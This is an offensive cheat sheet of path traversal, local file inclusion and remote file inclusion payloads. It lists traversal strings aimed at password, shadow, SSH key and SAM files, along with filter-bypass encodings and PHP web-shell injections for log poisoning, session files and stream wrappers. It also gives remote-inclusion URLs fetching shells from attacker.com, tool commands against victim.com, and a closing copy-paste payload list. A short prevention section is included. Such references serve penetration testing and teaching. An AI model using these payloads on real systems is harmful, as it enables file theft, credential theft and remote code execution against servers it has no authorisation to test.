# PATH TRAVERSAL / LFI / RFI PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS PATH TRAVERSAL / LFI / RFI?

- **Path Traversal (Directory Traversal):** Allows an attacker to access files outside the intended directory by using `../` sequences.
- **LFI (Local File Inclusion):** Occurs when an application includes a file from the local filesystem based on user input, potentially leading to code execution.
- **RFI (Remote File Inclusion):** Occurs when an application includes a remote file (from an attacker-controlled server), leading to immediate RCE.

**Impact:** Sensitive file disclosure (credentials, configs), source code leakage, and in many cases full Remote Code Execution.

---

## 2. BASIC PATH TRAVERSAL PAYLOADS

### Linux / Unix
```
../../../../etc/passwd
../../../../etc/hosts
../../../../etc/shadow
../../../../etc/group
../../../../etc/hostname
../../../../etc/resolv.conf
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/auth.log
../../../../root/.ssh/id_rsa
../../../../home/user/.bash_history
```

### Windows
```
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\boot.ini
..\..\..\..\windows\system.ini
..\..\..\..\windows\repair\sam
..\..\..\..\users\administrator\desktop\flag.txt
```

### Universal (Mixed)
```
../../../../../../../../../../etc/passwd
..\..\..\..\..\..\..\..\..\..\windows\win.ini
```

---

## 3. BYPASS TECHNIQUES FOR FILTERS

### 3.1 URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini
```

### 3.2 Double URL Encoding
```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
```

### 3.3 Unicode / UTF-8
```
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

### 3.4 Null Byte Injection (PHP < 5.3.4)
```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd\0
../../../../etc/passwd\0.jpg
```

### 3.5 Nested / Recursive Traversal
```
....//....//....//etc/passwd
....\\....\\....\\windows\\win.ini
..././..././..././etc/passwd
```

### 3.6 Absolute Path (If allowed)
```
/etc/passwd
C:\Windows\win.ini
```

### 3.7 Mixed Slashes
```
..\../..\../..\../etc/passwd
..\/..\/..\/etc/passwd
```

### 3.8 Using `%00` and Other Tricks
```
../../../../etc/passwd%00
../../../../etc/passwd%00.php
../../../../etc/passwd%2500
```

### 3.9 Path Truncation (Windows)
```
../../../../windows/win.ini..............................
../../../../windows/win.ini:::::::::::::::::::::::::::::
```

### 3.10 Using Environment Variables (Linux)
```
../../../../proc/self/cwd/../../../../etc/passwd
../../../../proc/self/root/etc/passwd
```

---

## 4. LOCAL FILE INCLUSION (LFI) PAYLOADS

LFI goes beyond reading files: it can execute code if the included file contains PHP or if we can inject PHP into a file we control.

### 4.1 Basic LFI
```
?page=../../../../etc/passwd
?file=../../../../etc/passwd
?include=../../../../etc/passwd
?template=../../../../etc/passwd
?lang=../../../../etc/passwd
?view=../../../../etc/passwd
```

### 4.2 LFI to RCE via Log Poisoning

**Step 1 – Inject PHP into a log file:**
```
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
Or via SSH log:
```
ssh '<?php system($_GET['cmd']); ?>'@target.com
```

**Step 2 – Include the log file:**
```
?page=../../../../var/log/apache2/access.log&cmd=whoami
?page=../../../../var/log/auth.log&cmd=whoami
?page=../../../../var/log/nginx/access.log&cmd=whoami
?page=../../../../var/log/httpd/access_log&cmd=whoami
```

### 4.3 LFI to RCE via /proc/self/environ
Inject PHP into the `User-Agent` header, then include:
```
?page=../../../../proc/self/environ&cmd=whoami
```

### 4.4 LFI to RCE via PHP Session Files
**Step 1 – Inject PHP into a session variable:**
```
POST /login.php
Cookie: PHPSESSID=12345
...
username=<?php system($_GET['cmd']); ?>
```
**Step 2 – Include the session file:**
```
?page=../../../../tmp/sess_12345&cmd=whoami
?page=../../../../var/lib/php/sessions/sess_12345&cmd=whoami
```

### 4.5 LFI to RCE via /proc/self/fd
```
?page=../../../../proc/self/fd/0
?page=../../../../proc/self/fd/1
?page=../../../../proc/self/fd/2
```

### 4.6 LFI to RCE via Email Logs
```
/var/mail/www-data
/var/mail/root
/var/spool/mail/www-data
```

### 4.7 LFI to RCE via PHP Wrappers

**Base64 encode (read source code):**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
```

**Execute PHP code (if allow_url_include is On):**
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
data://text/plain,<?php system($_GET['c']); ?>
```

**Input wrapper:**
```
php://input
```
POST data: `<?php system('whoami'); ?>`

**Expect wrapper (if extension enabled):**
```
expect://whoami
```

**Zip wrapper:**
```
zip:///path/to/file.zip%23shell.php
```

**Phar wrapper:**
```
phar:///path/to/file.phar/shell.php
```

### 4.8 LFI to RCE via /proc/self/cmdline
```
?page=../../../../proc/self/cmdline
```

### 4.9 LFI to RCE via File Upload + Include
1. Upload an image with PHP code in metadata or as a `.php.jpg` file.
2. Include the uploaded file:
```
?page=../../../../var/www/html/uploads/shell.php.jpg
```

---

## 5. REMOTE FILE INCLUSION (RFI) PAYLOADS

RFI requires `allow_url_include = On` in PHP. It directly executes remote code.

### 5.1 Basic RFI
```
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.php
?file=https://attacker.com/shell.txt
?include=http://attacker.com/shell.txt
```

### 5.2 RFI with Null Byte (PHP < 5.3.4)
```
?page=http://attacker.com/shell.txt%00
?page=http://attacker.com/shell.txt%00.jpg
```

### 5.3 RFI via Data Wrapper
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
?page=data://text/plain,<?php system($_GET['c']); ?>
```

### 5.4 RFI via php://input
```
POST /?page=php://input
<?php system('whoami'); ?>
```

### 5.5 RFI via FTP
```
?page=ftp://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```

---

## 6. DETECTION PAYLOADS (UNIVERSAL)

```
../../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://whoami
http://attacker.com/shell.txt
```

---

## 7. BYPASS CHEAT SHEET

| Filter | Bypass |
|--------|--------|
| `../` removed | `....//`, `..././`, `..%2f`, `%2e%2e%2f` |
| `../` replaced with empty | `....//`, `..././`, `..\..\` |
| `.` filtered | `%2e`, `%252e` |
| `/` filtered | `%2f`, `%252f`, `\` |
| `\` filtered | `%5c`, `%255c`, `/` |
| `etc/passwd` blacklisted | `%65%74%63%2f%70%61%73%73%77%64`, `....//....//etc/passwd` |
| `php://` filtered | `pHp://`, `PHP://`, `php%3a//` |
| `data://` filtered | `dAtA://`, `data%3a//` |
| Null byte filtered | Use path truncation (Windows), or `%00` double-encoded |
| WAF blocks `../` | Use `..%252f`, `..%c0%af`, `..%c0%ae%c0%af` |

---

## 8. TOOLS

| Tool | Usage |
|------|-------|
| **Burp Suite** | Manual testing with Intruder and Repeater. |
| **LFISuite** | Automatic LFI exploitation. |
| **Kadimus** | LFI scanning and exploitation. |
| **fimap** | Automated LFI/RFI exploitation. |
| **dotdotpwn** | Path traversal fuzzer. |
| **PayloadsAllTheThings** | Repository of LFI/RFI payloads. |
| **HackTricks** | Complete guide. |

**Commands:**
```bash
fimap -u "http://victim.com/?page=INJECT"
dotdotpwn -m http -h victim.com -f /etc/passwd -k "root:" -d 8
```

---

## 9. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Avoid user input in file paths** | Use a whitelist of allowed files. |
| **2. Use basename()** | In PHP: `$file = basename($_GET['file']);` |
| **3. Validate input** | Allow only alphanumeric, dashes, underscores. |
| **4. Use realpath()** | Check that the resolved path is within the intended directory. |
| **5. Disable allow_url_include** | In PHP: `allow_url_include = Off` |
| **6. Disable allow_url_fopen** | If not needed. |
| **7. Use open_basedir** | Restrict PHP file access to specific directories. |
| **8. Chroot / containers** | Isolate the application. |
| **9. Least privilege** | Run the web server as a low-privileged user. |
| **10. WAF and RASP** | Use rules to detect traversal patterns. |

---

## 10. TIPS FOR TESTING

1. Identify parameters that reference files (page, file, include, template, lang, view).
2. Start with simple `../../../../etc/passwd`.
3. If blocked, try URL encoding, double encoding, and Unicode.
4. Test both Linux and Windows paths.
5. If LFI works, try to escalate to RCE via log poisoning, session files, or wrappers.
6. If RFI is possible, host a simple PHP shell and include it.
7. Use Burp Collaborator or Interactsh to detect blind RFI.
8. Always test on your own environment first.
9. Use automated tools like LFISuite or fimap for efficiency.
10. Check for `php://filter` to read source code without execution.

---

## 11. QUICK REFERENCE – COMMON PATHS

| OS | Path |
|----|------|
| Linux | `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/proc/self/environ` |
| Linux logs | `/var/log/apache2/access.log`, `/var/log/auth.log`, `/var/log/nginx/access.log` |
| Linux sessions | `/tmp/sess_*`, `/var/lib/php/sessions/sess_*` |
| Windows | `C:\Windows\win.ini`, `C:\Windows\system.ini`, `C:\boot.ini` |
| Windows logs | `C:\Windows\System32\LogFiles\` |
| PHP wrappers | `php://filter`, `php://input`, `data://`, `expect://`, `zip://`, `phar://` |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
../../../../etc/passwd
../../../../etc/hosts
../../../../etc/shadow
../../../../etc/group
../../../../etc/hostname
../../../../etc/resolv.conf
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/auth.log
../../../../root/.ssh/id_rsa
../../../../home/user/.bash_history
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\boot.ini
..\..\..\..\windows\system.ini
..\..\..\..\windows\repair\sam
..\..\..\..\users\administrator\desktop\flag.txt
../../../../../../../../../../etc/passwd
..\..\..\..\..\..\..\..\..\..\windows\win.ini
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd\0
../../../../etc/passwd\0.jpg
....//....//....//etc/passwd
....\\....\\....\\windows\\win.ini
..././..././..././etc/passwd
/etc/passwd
C:\Windows\win.ini
..\../..\../..\../etc/passwd
..\/..\/..\/etc/passwd
../../../../etc/passwd%2500
../../../../windows/win.ini..............................
../../../../windows/win.ini:::::::::::::::::::::::::::::
../../../../proc/self/cwd/../../../../etc/passwd
../../../../proc/self/root/etc/passwd
?page=../../../../etc/passwd
?file=../../../../etc/passwd
?include=../../../../etc/passwd
?template=../../../../etc/passwd
?lang=../../../../etc/passwd
?view=../../../../etc/passwd
?page=../../../../var/log/apache2/access.log&cmd=whoami
?page=../../../../var/log/auth.log&cmd=whoami
?page=../../../../var/log/nginx/access.log&cmd=whoami
?page=../../../../var/log/httpd/access_log&cmd=whoami
?page=../../../../proc/self/environ&cmd=whoami
?page=../../../../tmp/sess_12345&cmd=whoami
?page=../../../../var/lib/php/sessions/sess_12345&cmd=whoami
?page=../../../../proc/self/fd/0
?page=../../../../proc/self/fd/1
?page=../../../../proc/self/fd/2
/var/mail/www-data
/var/mail/root
/var/spool/mail/www-data
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
data://text/plain,<?php system($_GET['c']); ?>
php://input
expect://whoami
zip:///path/to/file.zip%23shell.php
phar:///path/to/file.phar/shell.php
?page=../../../../proc/self/cmdline
?page=../../../../var/www/html/uploads/shell.php.jpg
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.php
?file=https://attacker.com/shell.txt
?include=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
?page=http://attacker.com/shell.txt%00.jpg
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
?page=data://text/plain,<?php system($_GET['c']); ?>
POST /?page=php://input
<?php system('whoami'); ?>
?page=ftp://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
fimap -u "http://victim.com/?page=INJECT"
dotdotpwn -m http -h victim.com -f /etc/passwd -k "root:" -d 8
```
